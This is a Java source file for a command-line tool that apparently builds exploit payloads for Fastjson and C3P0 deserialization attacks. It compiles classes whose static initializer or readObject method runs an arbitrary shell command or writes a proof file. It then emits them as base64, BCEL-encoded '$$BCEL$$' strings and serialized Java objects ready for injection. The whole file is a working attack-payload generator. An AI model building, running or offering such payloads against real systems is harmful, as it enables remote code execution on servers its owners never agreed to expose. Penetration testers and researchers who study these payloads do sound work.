package com.fastjson.toolkit.bytecode;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

/**
 * Generic bytecode generator CLI: touch / exec (+ BCEL / serialize helpers).
 *
 * <pre>
 *   java -jar bytecode-gen.jar generate &lt; req.json
 *   java -jar bytecode-gen.jar encode   &lt; {"classBytesBase64":"..."}
 *   java -jar bytecode-gen.jar serialize &lt; {"classBytesBase64":"...","className":"PresetSer"}
 * </pre>
 */
public final class BytecodeGenMain {
    private static final Gson GSON = new GsonBuilder().disableHtmlEscaping().create();
    private static final String ESCAPE = "$";
    private static final int FREE_CHARS = 48;
    private static final char[] CHAR_MAP = new char[64];

    static {
        int j = 0;
        for (int i = 'A'; i <= 'Z'; i++) {
            CHAR_MAP[j++] = (char) i;
        }
        for (int i = 'g'; i <= 'z'; i++) {
            CHAR_MAP[j++] = (char) i;
        }
        CHAR_MAP[j++] = '$';
        CHAR_MAP[j] = '_';
    }

    private BytecodeGenMain() {
    }

    public static void main(String[] args) {
        String action = args.length > 0 ? args[0].trim().toLowerCase() : "generate";
        try {
            if ("config".equals(action) || "--config".equals(action)) {
                Map<String, Object> cfg = new LinkedHashMap<String, Object>();
                cfg.put("modes", new String[]{"touch", "exec"});
                cfg.put("actions", new String[]{"generate", "encode", "serialize", "config"});
                System.out.println(GSON.toJson(cfg));
                return;
            }
            String raw = readStdin();
            if (raw == null || raw.trim().isEmpty()) {
                fail("stdin JSON is empty");
                return;
            }
            if ("generate".equals(action) || "--generate".equals(action)) {
                System.out.println(GSON.toJson(generate(raw)));
                return;
            }
            if ("encode".equals(action) || "--encode".equals(action)) {
                System.out.println(GSON.toJson(encodeOnly(raw)));
                return;
            }
            if ("serialize".equals(action) || "--serialize".equals(action)) {
                System.out.println(GSON.toJson(serializeOnly(raw)));
                return;
            }
            fail("unknown action: " + action + " (use config|generate|encode|serialize)");
        } catch (Throwable t) {
            JsonObject err = new JsonObject();
            err.addProperty("error", String.valueOf(t.getMessage() == null ? t : t.getMessage()));
            System.out.println(GSON.toJson(err));
            System.exit(1);
        }
    }

    private static void fail(String msg) {
        JsonObject err = new JsonObject();
        err.addProperty("error", msg);
        System.out.println(GSON.toJson(err));
        System.exit(1);
    }

    private static String readStdin() throws Exception {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(System.in, StandardCharsets.UTF_8))) {
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append('\n');
            }
        }
        return sb.toString();
    }

    private static Map<String, Object> generate(String raw) throws Exception {
        JsonObject root = JsonParser.parseString(raw).getAsJsonObject();
        String mode = text(root, "mode", "exec");
        if (!"touch".equals(mode) && !"exec".equals(mode)) {
            throw new IllegalArgumentException("mode must be touch|exec");
        }
        String cmd = text(root, "cmd", "id");
        String proofPath = text(root, "proofPath", "/tmp/fj_preset");
        String proofContent = text(root, "proofContent", "FJ_PRESET");
        boolean forC3p0 = root.has("forC3p0") && root.get("forC3p0").getAsBoolean();
        String className = text(root, "className", forC3p0 ? "PresetSer" : "PresetPayload");

        String source = forC3p0
                ? buildSerializableSource(className, mode, cmd, proofPath, proofContent)
                : buildStaticSource(className, mode, cmd, proofPath, proofContent);

        File tmp = Files.createTempDirectory("bytecode-gen-").toFile();
        try {
            byte[] classBytes = compileSource(tmp, className, source);
            String b64 = Base64.getEncoder().encodeToString(classBytes);
            String bcel = "$$BCEL$$" + bcelEncode(classBytes, true);

            Map<String, Object> art = new LinkedHashMap<String, Object>();
            art.put("className", className);
            art.put("classSize", classBytes.length);
            art.put("classBytesBase64", b64);
            art.put("bcelCode", bcel);
            art.put("mode", mode);
            art.put("cmd", cmd);
            art.put("proofPath", proofPath);
            art.put("source", source);

            if (forC3p0) {
                String serB64 = serializeInstance(tmp, className, source);
                art.put("serializedBase64", serB64);
            }

            Map<String, Object> out = new LinkedHashMap<String, Object>();
            out.put("bytecodeResult", art);
            return out;
        } finally {
            deleteTree(tmp);
        }
    }

    private static Map<String, Object> encodeOnly(String raw) throws Exception {
        JsonObject root = JsonParser.parseString(raw).getAsJsonObject();
        String b64 = text(root, "classBytesBase64", "");
        if (b64.isEmpty()) {
            throw new IllegalArgumentException("missing classBytesBase64");
        }
        byte[] classBytes = Base64.getDecoder().decode(b64);
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        out.put("bcelCode", "$$BCEL$$" + bcelEncode(classBytes, true));
        out.put("classSize", classBytes.length);
        return out;
    }

    private static Map<String, Object> serializeOnly(String raw) throws Exception {
        JsonObject root = JsonParser.parseString(raw).getAsJsonObject();
        String b64 = text(root, "classBytesBase64", "");
        String className = text(root, "className", "PresetSer");
        if (b64.isEmpty()) {
            throw new IllegalArgumentException("missing classBytesBase64");
        }
        byte[] classBytes = Base64.getDecoder().decode(b64);
        File tmp = Files.createTempDirectory("bytecode-ser-").toFile();
        try {
            File classFile = new File(tmp, className + ".class");
            Files.write(classFile.toPath(), classBytes);
            String serB64 = serializeLoaded(tmp, className);
            Map<String, Object> out = new LinkedHashMap<String, Object>();
            out.put("serializedBase64", serB64);
            out.put("className", className);
            return out;
        } finally {
            deleteTree(tmp);
        }
    }

    private static String serializeInstance(File dir, String className, String payloadSrc) throws Exception {
        // already compiled payload; compile SerializeMain
        String mainSrc = ""
                + "import java.io.FileOutputStream;\n"
                + "import java.io.ObjectOutputStream;\n"
                + "public class SerializeMain {\n"
                + "  public static void main(String[] args) throws Exception {\n"
                + "    String out = args.length > 0 ? args[0] : \"preset.ser\";\n"
                + "    Object obj = new " + className + "();\n"
                + "    try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out))) {\n"
                + "      oos.writeObject(obj);\n"
                + "    }\n"
                + "  }\n"
                + "}\n";
        compileSource(dir, "SerializeMain", mainSrc);
        File ser = new File(dir, "preset.ser");
        ProcessBuilder pb = new ProcessBuilder(
                javaHomeBin("java"), "-cp", dir.getAbsolutePath(), "SerializeMain", ser.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        String log = slurp(p.getInputStream());
        int code = p.waitFor();
        if (code != 0 || !ser.isFile()) {
            throw new IllegalStateException("serialize failed: " + log);
        }
        byte[] data = Files.readAllBytes(ser.toPath());
        if (data.length < 4 || (data[0] & 0xff) != 0xac || (data[1] & 0xff) != 0xed) {
            throw new IllegalStateException("serialized output missing Java stream magic");
        }
        return Base64.getEncoder().encodeToString(data);
    }

    private static String serializeLoaded(File dir, String className) throws Exception {
        URLClassLoader cl = new URLClassLoader(new URL[]{dir.toURI().toURL()}, null);
        try {
            Class<?> clazz = cl.loadClass(className);
            Object obj = clazz.getDeclaredConstructor().newInstance();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
                oos.writeObject(obj);
            }
            return Base64.getEncoder().encodeToString(bos.toByteArray());
        } finally {
            cl.close();
        }
    }

    private static byte[] compileSource(File dir, String className, String source) throws Exception {
        File src = new File(dir, className + ".java");
        Files.write(src.toPath(), source.getBytes(StandardCharsets.UTF_8));
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        if (compiler == null) {
            // fallback: javac on PATH
            ProcessBuilder pb = new ProcessBuilder(
                    whichOr("javac"),
                    "-encoding", "UTF-8",
                    "-source", "8",
                    "-target", "8",
                    "-cp", dir.getAbsolutePath(),
                    "-d", dir.getAbsolutePath(),
                    src.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            String log = slurp(p.getInputStream());
            int code = p.waitFor();
            if (code != 0) {
                throw new IllegalStateException("javac failed:\n" + log);
            }
        } else {
            int code = compiler.run(null, null, null,
                    "-encoding", "UTF-8",
                    "-source", "8",
                    "-target", "8",
                    "-cp", dir.getAbsolutePath(),
                    "-d", dir.getAbsolutePath(),
                    src.getAbsolutePath());
            if (code != 0) {
                throw new IllegalStateException("JavaCompiler failed for " + className);
            }
        }
        File classFile = findClass(dir, className);
        if (classFile == null) {
            throw new IllegalStateException("missing compiled class: " + className);
        }
        return Files.readAllBytes(classFile.toPath());
    }

    private static File findClass(File dir, String className) {
        File direct = new File(dir, className + ".class");
        if (direct.isFile()) {
            return direct;
        }
        File[] kids = dir.listFiles();
        if (kids == null) {
            return null;
        }
        for (File f : kids) {
            if (f.isDirectory()) {
                File hit = findClass(f, className);
                if (hit != null) {
                    return hit;
                }
            } else if (f.getName().equals(className + ".class")) {
                return f;
            }
        }
        return null;
    }

    private static String buildStaticSource(
            String className, String mode, String cmd, String proofPath, String proofContent) {
        return "public class " + className + " {\n"
                + "    static {\n"
                + clinitBody(mode, cmd, proofPath, proofContent)
                + "    }\n"
                + "}\n";
    }

    private static String buildSerializableSource(
            String className, String mode, String cmd, String proofPath, String proofContent) {
        return "import java.io.ObjectInputStream;\n"
                + "import java.io.ObjectOutputStream;\n"
                + "import java.io.Serializable;\n"
                + "public class " + className + " implements Serializable {\n"
                + "    private static final long serialVersionUID = 1L;\n"
                + "    private void writeObject(ObjectOutputStream out) throws Exception {\n"
                + "        out.defaultWriteObject();\n"
                + "    }\n"
                + "    private void readObject(ObjectInputStream in) throws Exception {\n"
                + "        in.defaultReadObject();\n"
                + clinitBody(mode, cmd, proofPath, proofContent)
                + "    }\n"
                + "}\n";
    }

    private static String clinitBody(String mode, String cmd, String proofPath, String proofContent) {
        StringBuilder sb = new StringBuilder();
        if ("touch".equals(mode) || (proofPath != null && !proofPath.isEmpty())) {
            sb.append("            try {\n")
                    .append("                java.nio.file.Path p = java.nio.file.Paths.get(\"")
                    .append(javaString(proofPath)).append("\");\n")
                    .append("                java.nio.file.Path parent = p.getParent();\n")
                    .append("                if (parent != null) {\n")
                    .append("                    java.nio.file.Files.createDirectories(parent);\n")
                    .append("                }\n")
                    .append("                String body = \"").append(javaString(proofContent))
                    .append("-\" + System.currentTimeMillis() + \"\\n\";\n")
                    .append("                java.nio.file.Files.write(p, body.getBytes(java.nio.charset.StandardCharsets.UTF_8));\n")
                    .append("            } catch (Throwable ignored) {\n")
                    .append("            }\n");
        }
        if ("exec".equals(mode)) {
            sb.append("            try {\n")
                    .append("                String[] _cmds;\n")
                    .append("                {\n")
                    .append("                    String _os = System.getProperty(\"os.name\", \"\");\n")
                    .append("                    boolean _win = _os.toLowerCase().contains(\"win\");\n")
                    .append("                    _cmds = _win\n")
                    .append("                        ? new String[]{\"cmd.exe\", \"/c\", \"")
                    .append(javaString(cmd)).append("\"}\n")
                    .append("                        : new String[]{\"/bin/sh\", \"-c\", \"")
                    .append(javaString(cmd)).append("\"};\n")
                    .append("                }\n")
                    .append("                Runtime.getRuntime().exec(_cmds);\n")
                    .append("            } catch (Throwable ignored) {\n")
                    .append("            }\n");
        }
        return sb.toString();
    }

    private static String javaString(String s) {
        if (s == null) {
            return "";
        }
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "\\r")
                .replace("\n", "\\n");
    }

    private static String bcelEncode(byte[] data, boolean compress) throws Exception {
        byte[] raw = compress ? gzip(data) : data;
        StringBuilder out = new StringBuilder(raw.length * 2);
        for (byte b : raw) {
            int v = b & 0xff;
            if (isJavaIdentifierPart(v) && v != ESCAPE.charAt(0)) {
                out.append((char) v);
                continue;
            }
            out.append(ESCAPE);
            if (v < FREE_CHARS) {
                out.append(CHAR_MAP[v]);
            } else {
                String hx = Integer.toHexString(v);
                if (hx.length() == 1) {
                    out.append('0');
                }
                out.append(hx);
            }
        }
        return out.toString();
    }

    private static byte[] gzip(byte[] data) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (GZIPOutputStream gos = new GZIPOutputStream(bos) {
            {
                // mtime=0 for stable output
                try {
                    Method m = GZIPOutputStream.class.getDeclaredMethod("writeHeader");
                } catch (Exception ignore) {
                }
            }
        }) {
            gos.write(data);
        }
        return bos.toByteArray();
    }

    private static boolean isJavaIdentifierPart(int ch) {
        return (ch >= 'a' && ch <= 'z')
                || (ch >= 'A' && ch <= 'Z')
                || (ch >= '0' && ch <= '9')
                || ch == '_';
    }

    private static String text(JsonObject root, String key, String def) {
        if (!root.has(key) || root.get(key).isJsonNull()) {
            return def;
        }
        String v = root.get(key).getAsString();
        return v == null || v.trim().isEmpty() ? def : v.trim();
    }

    private static String slurp(java.io.InputStream in) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) >= 0) {
            bos.write(buf, 0, n);
        }
        return new String(bos.toByteArray(), StandardCharsets.UTF_8);
    }

    private static String whichOr(String name) {
        String path = System.getenv("PATH");
        if (path != null) {
            for (String p : path.split(File.pathSeparator)) {
                File f = new File(p, name + (isWindows() ? ".exe" : ""));
                if (f.isFile()) {
                    return f.getAbsolutePath();
                }
            }
        }
        return name;
    }

    private static String javaHomeBin(String name) {
        String home = System.getProperty("java.home");
        if (home != null) {
            File f = new File(new File(home, "bin"), name + (isWindows() ? ".exe" : ""));
            if (f.isFile()) {
                return f.getAbsolutePath();
            }
            // jre/../bin
            File f2 = new File(new File(new File(home).getParentFile(), "bin"),
                    name + (isWindows() ? ".exe" : ""));
            if (f2.isFile()) {
                return f2.getAbsolutePath();
            }
        }
        return whichOr(name);
    }

    private static boolean isWindows() {
        String os = System.getProperty("os.name", "");
        return os.toLowerCase().contains("win");
    }

    private static void deleteTree(File f) {
        if (f == null || !f.exists()) {
            return;
        }
        File[] kids = f.listFiles();
        if (kids != null) {
            for (File k : kids) {
                deleteTree(k);
            }
        }
        //noinspection ResultOfMethodCallIgnored
        f.delete();
    }
}
